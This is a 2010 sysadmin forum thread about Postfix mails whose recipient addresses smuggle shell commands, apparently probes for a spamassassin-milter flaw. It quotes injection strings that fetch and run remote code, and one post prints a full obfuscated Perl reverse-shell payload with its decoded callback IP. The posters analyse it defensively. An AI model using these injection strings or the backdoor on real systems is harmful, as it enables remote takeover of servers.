---
title: "Postfix hack attempt using shell command as recipient?!"
date: 2010-03-17
forum: Server Platforms
---

### Post by XoloX on 2010-03-17
Hi folks. For almost a year now I've been running Ubuntu on a virtual private server that hosts my website and e-mail, as well as several other websites. A cron job performs a daily incremental backup using rsync to transfer the changes from the VPS to my home server and cron mails me the rsync output, which enables me to easily inspect all daily changes on the VPS. This morning while sifting through the rsync output I noticed that /root/Maildir/ had been created and there were three e-mails in there. The first thing I thought was "That shouldn't be, I aliased root to my user account in /etc/aliases!". Anyway, here's the contents of one of those e-mails:

```
Return-Path: <blue@dick.com>
X-Original-To: "root+:|GET http://61.100.185.177/busy-2.php"
Delivered-To: "root+:|GET http://61.100.185.177/busy-2.php"@mail.peterodding.com
Received: from bluedick (mail.modaintl.com [68.236.170.186])
    by mail.peterodding.com (Postfix) with SMTP id 19E4E2029AED;
    Tue, 16 Mar 2010 13:09:11 +0100 (CET)
Message-Id: <20100316120912.19E4E2029AED@mail.peterodding.com>
Date: Tue, 16 Mar 2010 13:09:11 +0100 (CET)
From: blue@dick.com
To: undisclosed-recipients:;
```That's all, there's no message body. The other two e-mails are exactly the same except they use curl and wget instead of GET and they download different addresses (busy-[123].php, probably so the attacker knows which of the attacks worked). Now obviously this was an attempt to hack into my server, but what I don't know is whether I should be worried :). It seems that Postfix didn't actually execute the shell command in the recipient address.

Also, as I said before, I've aliased the root account to my personal account. I know that plus signs in e-mail addresses are treated specially by some mail servers, i.e. everything after the plus sign is stripped to find the username to which the message should be delivered. So why was the message delivered to root (i.e. Postfix did eventually strip the plus sign to find the user account) instead of to the user account that root has been aliased to in /etc/aliases?!

Thanks in advance for any insights you can (hopefully ;)) provide in this matter!

---

### Post by KB1JWQ on 2010-03-17
Oh boy, an interesting problem!

First off, stop worrying.  There hasn't been a known root exploit in Postfix for quite some time (ever?), and none of them were triggered like this.

Can you post the output of postconf -n?

---

### Post by jrssystemsnet on 2010-03-17
This was a phishing expedition, basically - the guy sending the emails is looking for servers which will accept shell command aliases by root; any server which will do so will go fetch the content of that web page (which is already removed, incidentally) thereby giving him a list of machines he can go back and compromise at his leisure.

You can make absolutely certain this didn't work by testing it yourself - try sending an email to 
```
"root+:|touch /tmp/ismypostfixhackable.txt"@mail.peterodding.com
```

... and see if  "ismypostfixhackable.txt" appears in /tmp.

---

### Post by jrssystemsnet on 2010-03-17
Incidentally, I *think* this is specifically a Sendmail problem - Postfix does allow sending mail to a command, but AFAIK you have to individually set up an alias for a given address to the command in order to do it, I don't think you can arbitrarily route to a command just by appending a pipe to an email address.

---

### Post by KB1JWQ on 2010-03-17
I agree wholeheartedly, but I'm curious to see how it ended up getting delivered locally at all.  That's why I want to see the output of postconf -n

---

### Post by XoloX on 2010-03-18
> **KB1JWQ said:**
> Oh boy, an interesting problem!

First off, stop worrying.  There hasn't been a known root exploit in Postfix for quite some time (ever?), and none of them were triggered like this.

OK that's good to know, thanks for the reassurance!

> **KB1JWQ said:**
> Can you post the output of postconf -n?

Sure, here it is:

```
alias_database = hash:/etc/aliases
alias_maps = hash:/etc/aliases
allow_mail_to_commands = alias,forward
append_dot_mydomain = no
biff = no
broken_sasl_auth_clients = yes
config_directory = /etc/postfix
home_mailbox = Maildir/
inet_interfaces = all
inet_protocols = ipv4
mailbox_size_limit = 0
mydestination = $myhostname, localhost.$mydomain, localhost
myhostname = mail.peterodding.com
mynetworks = 127.0.0.0/8
myorigin = /etc/mailname
readme_directory = no
recipient_delimiter = +
relayhost = 
smtp_tls_note_starttls_offer = yes
smtp_tls_security_level = may
smtpd_banner = $myhostname ESMTP $mail_name
smtpd_recipient_restrictions = permit_mynetworks,permit_sasl_authenticated,reject_unauth_destination
smtpd_sasl_auth_enable = yes
smtpd_sasl_local_domain = 
smtpd_sasl_security_options = noanonymous
smtpd_tls_CAfile = /etc/ssl/certs/cacert.pem
smtpd_tls_auth_only = no
smtpd_tls_cert_file = /etc/ssl/certs/smtpd.crt
smtpd_tls_key_file = /etc/ssl/private/smtpd.key
smtpd_tls_loglevel = 1
smtpd_tls_received_header = yes
smtpd_tls_security_level = may
smtpd_tls_session_cache_timeout = 3600s
tls_random_source = dev:/dev/urandom
virtual_alias_domains = mailinghelper.nl, unsubscribe.mailinghelper.nl, jadethomson.com, peterodding.com, yokafashions.com
virtual_alias_maps = hash:/etc/postfix/virtual
```

I guess the recipient_delimiter option is relevant, but as you can see its set properly yet the mail was delivered to the root account instead of redirected to my personal account (as per the root &#8594; peter alias in /etc/aliases).

> **jrssystemsnet said:**
> This was a phishing expedition, basically - the guy sending the emails is looking for servers which will accept shell command aliases by root; any server which will do so will go fetch the content of that web page (which is already removed, incidentally) thereby giving him a list of machines he can go back and compromise at his leisure.

I figured as much and like you I noticed that the web page was already gone :) but thanks for confirming that this was basically the equivalent of a port scan for insecure mail systems.

> **jrssystemsnet said:**
> You can make absolutely certain this didn't work by testing it yourself - try sending an email to 
```
"root+:|touch /tmp/ismypostfixhackable.txt"@mail.peterodding.com
```... and see if "ismypostfixhackable.txt" appears in /tmp.

No file appears in /tmp/ so my Postfix install remains secure :D but the message is indeed delivered to root's inbox instead of my own. It appears as if Postfix resolves aliases first and only then looks at the recipient_delimiter option.

---

### Post by bloody velvet on 2010-03-18
I've also received these attempts. (Except mine use an ip instead "http://61.100.185.177/busy-1.php".)

I also got one 4 days ago that tried:

```

Return-Path: <blue@dick.com>
X-Original-To: "root+:|wget http://www.linux-echo.de/.x/p.txt;perl p.txt"

```I was able to snatch that file at the time, and have attached it here if anyone is curious. It's perl code, so be warned.

---

### Post by jrssystemsnet on 2010-03-18
```
#!/usr/bin/perl
#

use Socket;
$File="\x2f\x74\x6d\x70\x2f\x73\x65\x73\x73\x5f\x65\x30\x30\x64\x64\x34\x6c\x62\x6f\x32\x61\x64\x32\x37\x35\x38\x6e\x39\x66\x63\x36\x34\x31\x65\x34\x37\x63\x64\x37\x36\x78\x39";
$perm="\x32\x30\x33\x2e\x35\x39\x2e\x31\x32\x33\x2e\x31\x31\x34";
$port="\x38\x30";
$fake="/usr/sbin/httpd";
if ($ARGV[0]) {
        $perm=$ARGV[0];
}
$proto = getprotobyname('tcp') || die("[x] Error: getprotobyname()\n\n");
socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("[x] Error: Socket()\n");
if (!connect(SERVER, pack "SnA4x8", 2, $port, inet_aton($perm))) {
        die("! NO.\n");
}
if (!fork( )) {
        $0=$fake."\0"x16;;
        open(STDIN,">&SERVER");
        open(STDOUT,">&SERVER");
        open(STDERR,">&SERVER");
        system("unset HISTFILE;unset HISTSIZE;unset HISTFILESIZE;HISTFILE=/dev/null;rm -rf /tmp/.bash_*");
        system("echo;echo \"\e[1;29m\" Machine: `uname -a`");
        system("echo \"\e[1;34m\"");
        system("echo -----------------------------------------------------------------------------------");
        system("w");
        system("echo -----------------------------------------------------------------------------------");
        if (-f $File) { system("echo [x] xeQted ; cat $File"); }
        if ((-x "/usr/bin/wget") && (-e "/usr/bin/wget")) { system("echo -ne \"\e[05;32m[Wget: Yes]\e[00m\" "); }
        if ((-x "/usr/bin/curl") && (-e "/usr/bin/curl")) { system("echo  -ne \"\e[05;32m[Curl: Yes]\e[00m\" "); }
        if ((-x "/usr/bin/fetch") && (-e "/usr/bin/fetch")) { system("echo -ne \"\e[05;32m[Fetch: Yes]\e[00m\" "); }
        if ((-x "/usr/bin/GET") && (-e "/usr/bin/GET")) { system("echo -ne \"\e[05;32m[GET: Yes]\e[00m\" "); }
        if ((-x "/usr/bin/lwp-download") && (-e "/usr/bin/lwp-download")) { system("echo -ne \"\e[05;32m[LWP: Yes]\e[00m\" "); }
        if ((-x "/usr/bin/lynx") && (-e "/usr/bin/lynx")) { system("echo -ne \"\e[05;32m[Lynx: Yes]\e[00m\";echo "); }
        if ((-x "/usr/bin/gcc") && (-e "/usr/bin/gcc")) { system("echo -ne \"\e[05;32m[GCC: Yes]\e[00m\" "); }
        if (-e "/etc/udev/udev.conf") { system("echo -ne \"\e[05;32m UDEV Detected.\e[00m\" "); }
        if ((-x "/usr/bin/suidperl") && (-e "/usr/bin/suidperl")) { system("echo -ne \"\e[05;32m SuidPerl Detected.\e[00m\" "); }
        system("echo \"\e[1;32m\";id");
        system("echo;echo;echo + Opening /bin/bash complex shell...");
        open pySHELL, ">/tmp/shell.py" or die $!;
        print pySHELL 'import pty; pty.spawn(\'/bin/bash\')';
        close pySHELL;
        system("python /tmp/shell.py");
        system("echo ! /bin/bash failed.");
        system("echo + /bin/sh Shell Success full.");
        exec {'/bin/sh'} $fake . "\0" x4;
        unlink($File);
        exit(0);
}
print "+ oK.\n";
```

From the looks of it, it tries to open up what is effectively a telnet connection with a bash shell (root if possible) on the other end, which camouflages itself by pretending to be an Apache instance if you look at it in top or ps.

I can't be stuffed to de-obfuscate the hex-encoded crap, if somebody else wants to, jump right in. :)

---

### Post by bloody velvet on 2010-03-18
You end up with:
```

$File="/tmp/sess_e00dd4lbo2ad2758n9fc641e47cd76x9";
$perm="203.59.123.114";

```

Which leads me to read this:
[http://isc.sans.org/diary.html?date=2010-03-15](http://isc.sans.org/diary.html?date=2010-03-15)

---

### Post by XoloX on 2010-03-19
> **bloody velvet said:**
> 
Which leads me to read this:
[http://isc.sans.org/diary.html?date=2010-03-15](http://isc.sans.org/diary.html?date=2010-03-15)

I've read about the spamassassin vulnerability but I hadn't made the connection because I'm not very knowledgeable about spamassassin; I know what it does and have some idea of how it works but that is about it. The page you linked to implies that these are attempts to exploit the vulnerability. Is this correct?

---

### Post by jrssystemsnet on 2010-03-19
Yeah, but the important bit to note is that the vuln is not in SA itself, it's in spamassassin-*milter*... which *can* be used in Postfix servers, but normally is only seen in Sendmail servers.  The whole "milter" interface concept is a Sendmail-ism.

---

### Post by dacool25 on 2010-04-20
I too had something like this show up:

```
Apr 18 14:48:38 myserver postfix/qmgr[1802]: 1542F2056C: from=<blue@****.com>, size=203, nrcpt=1 (queue active)
Apr 18 14:48:38 myserver postfix/smtpd[12476]: disconnect from unknown[135.196.243.201]
Apr 18 14:48:52 myserver postfix/smtpd[12483]: connect from localhost[127.0.0.1]
Apr 18 14:48:52 myserver postfix/smtpd[12483]: 510422064F: client=localhost[127.0.0.1]
Apr 18 14:48:52 myserver postfix/cleanup[12480]: 510422064F: message-id=<20100418184852.510422064F@myserver.mysite.com>
Apr 18 14:48:52 myserver postfix/smtpd[12483]: disconnect from localhost[127.0.0.1]
Apr 18 14:48:52 myserver postfix/qmgr[1802]: 510422064F: from=<blue@****.com>, size=1041, nrcpt=1 (queue active)
Apr 18 14:48:52 myserver amavis[4240]: (04240-16) Passed BAD-HEADER, [135.196.243.201] [135.196.243.201] <blue@****.com> -> <"root+:|wget http://fortunes.in/x1x.php"@myserver.mysite.com>, quarantine: X/badh-XQqZlXm4bqH6, mail_id: XQqZ$
Apr 18 14:48:52 myserver postfix/smtp[12481]: 1542F2056C: to=<root+:|wget http://fortunes.in/x1x.php@myserver.mysite.com>, orig_to=<root+:|wget http://fortunes.in/x1x.php>, relay=127.0.0.1[127.0.0.1]:10024, delay=15, delays=0.23/0.03/$
Apr 18 14:48:52 myserver postfix/qmgr[1802]: 1542F2056C: removed   
Apr 18 14:48:52 myserver postfix/local[12487]: warning: 510422064F: address with illegal extension: root+:|wget http://fortunes.in/x1x.php
Apr 18 14:48:52 myserver postfix/local[12487]: 510422064F: to=<root+:|wget http://fortunes.in/x1x.php@myserver.mysite.com>, relay=local, delay=0.18, delays=0.08/0.06/0/0.04, dsn=2.0.0, status=sent (delivered to mailbox)
Apr 18 14:48:52 myserver postfix/qmgr[1802]: 510422064F: removed
```

What should we be looking for in postconf -n to see if you can run commands like the hacker is trying to do?

---

### Post by KB1JWQ on 2010-04-20
Handoff to a milter.

---

### Post by dacool25 on 2010-04-20
> **KB1JWQ said:**
> Handoff to a milter.

Kind of broad.. That's the parameter name?

---

